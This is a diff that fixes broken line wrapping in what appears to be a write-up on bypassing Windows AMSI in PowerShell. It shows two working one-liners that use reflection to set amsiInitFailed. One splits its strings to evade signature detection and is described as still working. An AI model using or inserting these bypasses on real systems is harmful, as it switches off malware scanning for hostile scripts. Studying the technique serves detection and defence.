@@ -62,8 +62,7 @@ characters long. It uses reflection to set amsiInitFailed to True, which
 effectively turns off AMSI in a PowerShell session.
 
 ```
-[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('=
-amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
 
 Today, the 1-liner gets caught because strings such as 'AmsiUtils' and
@@ -78,8 +77,7 @@ Today, a trivial combination of those two simple ideas still works. Still
 under 140 characters! An 8 year old hacker could have come up with that.
 
 ```
-[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetFiel=
-d("amsiInit"+"Failed","NonPublic,Static").SetValue($null,$true)
+[Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsiInit"+"Failed","NonPublic,Static").SetValue($null,$true)
 ```
 
 The screenshot below shows a blacklisted keyword getting caught by AMSI,
